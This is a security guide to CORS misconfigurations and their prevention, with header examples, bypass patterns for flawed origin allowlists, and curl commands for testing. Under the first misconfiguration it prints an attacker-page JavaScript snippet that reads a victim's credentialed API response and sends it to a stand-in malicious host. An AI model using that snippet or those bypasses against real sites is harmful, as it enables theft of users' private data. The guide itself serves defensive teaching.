# CORS Security & Misconfiguration Prevention

> CORS (Cross-Origin Resource Sharing) extends the Same-Origin Policy, allowing controlled cross-origin access. Misconfigured CORS — especially reflecting arbitrary origins with credentials — is a serious vulnerability that lets attacker-controlled pages read sensitive API responses.
>
> Source: [PortSwigger — Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)

---

## What Is CORS

CORS is a **browser mechanism** (a set of HTTP response headers) that lets a server tell the browser: "allow `https://partner.com` to read my responses." It does **not** affect non-browser clients — `curl` and mobile apps are not bound by CORS.

> ❗ **CORS is NOT a CSRF defense.** Browsers still send credentials (cookies) on cross-origin requests. CORS just controls whether the **attacker can read the response**.

---

## The Same-Origin Policy (SOP) Baseline

By default, browsers block cross-origin requests. The `Origin` header in a cross-origin request reveals where the request came from. CORS headers relax this.

The key header:
```
Access-Control-Allow-Origin: https://yoursite.com
```
- `*` = any origin (no credentials)
- Specific origin = that origin only
- `null` = special cases (see below)

With credentials:
```
Access-Control-Allow-Origin: https://yoursite.com
Access-Control-Allow-Credentials: true
```
> When `Access-Control-Allow-Credentials: true` is set, `Access-Control-Allow-Origin` **must not be `*`**.

---

## Common CORS Misconfigurations & Attacks

### Misconfig 1: Reflecting Arbitrary Origins with Credentials

This is the **most dangerous and most common** CORS misconfiguration:

```
Attacker request:
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...

Server response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

Any domain can read the victim's data. The attacker's page:
```javascript
fetch('https://vulnerable-website.com/sensitive-victim-data', {
  credentials: 'include'
}).then(r => r.text()).then(data => {
  fetch('https://malicious-website.com/log?key=' + data);
});
```

### Misconfig 2: Flawed Origin Whitelist Matching

Servers that allow access from domains matching a pattern (e.g., `ends with example.com`) can be tricked:

| Intended Allow | Bypass |
|----------------|--------|
| Allow `*.example.com` | Register `hackersnormal-website.com` (matches suffix) |
| Allow domains starting with `example.com` | Use `example.com.evil-user.net` |

**Always use exact origin matching, not regex/prefix matching.**

### Misconfig 3: Whitelisting `null` Origin

The `Origin: null` value appears in:
- Cross-origin redirects
- `file://` protocol requests
- Sandboxed iframe requests
- Serialized data

If the server reflects `null` with credentials:
```
Origin: null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
The attacker can use a **sandboxed iframe** to trigger this, gaining access.

### Misconfig 4: Allowing Untrusted Subdomains

If the server allows access from `https://*.example.com` and an attacker compromises a subdomain (DNS takeover, XSS on `blog.example.com`), they inherit trust to read data from the main site.

### Misconfig 5: HTTP Origin in HTTPS Allowlist

If your HTTPS app whitelists a subdomain that's still on HTTP:
```
Origin: http://trusted-subdomain.vulnerable-website.com
→ Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
→ Access-Control-Allow-Credentials: true
```

An attacker on open WiFi can **intercept** this HTTP request and inject a spoofed response that makes a CORS request to the HTTPS site, reading sensitive data. This works **even if your main site is fully HTTPS** with `Secure` cookies.

---

## How CORS Attacks Chain

CORS misconfigurations are rarely exploitable alone — they need an accomplice:

1. **CORS + XSS:** If `subdomain.victim.com` is vulnerable to XSS and `victim.com` trusts `subdomain.victim.com` via CORS, an attacker can use the XSS to make CORS requests to the main site.
2. **CORS + Open redirect:** A redirect from a trusted domain to an attacker domain can be used to satisfy origin checks.
3. **CORS + CSRF:** CORS doesn't prevent the request from being sent (and credentials are sent automatically). It only prevents reading the response.

---

## Best Practices for Secure CORS

### ✅ Do This
- **Set specific origins** in `Access-Control-Allow-Origin`, never `*` (with credentials)
- **Never reflect the request `Origin`** back without validation
- **Validate origins against an explicit allowlist** (exact string match)
- **Use strict origin matching** — exact match only, no prefix/wildcard/suffix matching
- **Avoid allowing `null` origin** with credentials
- **Audit trusted subdomains** regularly — an XSS on any trusted subdomain is game over
- **Use CORS only where needed** — don't widen the trust boundary unnecessarily

### ❌ Never Do This
- `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (browsers block `*` with credentials)
- Reflecting the request `Origin` header back to any origin with credentials
- Using regex/prefix matching to validate origins
- Trusting subdomains you don't control
- Whitelisting HTTP origins on HTTPS sites

---

## CORS Without Credentials (Lower Risk)

For public APIs that don't need user sessions:
```
Access-Control-Allow-Origin: *
```
This allows any origin to read responses. This is acceptable **only if**:
- The data is public
- The endpoint doesn't process cookies or authentication
- The response doesn't contain sensitive info (API keys, user data, etc.)

Even then, be cautious — an XSS on any site could abuse your API.

---

## Testing Your CORS Configuration

```bash
# Check response headers
curl -sI -H "Origin: https://malicious-website.com" \
  https://yourapp.com/api/data \
  | grep -i -E "access-control"

# Test with credentials
curl -s -H "Origin: https://malicious-website.com" \
  -H "Cookie: sessionid=..." \
  https://yourapp.com/api/data
```

- **Mozilla Observatory** and **Burp Suite** check for CORS misconfigurations
- Test from **multiple origins**, including `null`
- Test with and without the `Origin` header
- Test cross-origin **redirects**

---

## References
- [MDN: CORS Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)
- [PortSwigger: CORS Labs](https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors)
- [W3C: CORS Specification](https://www.w3.org/TR/cors/)
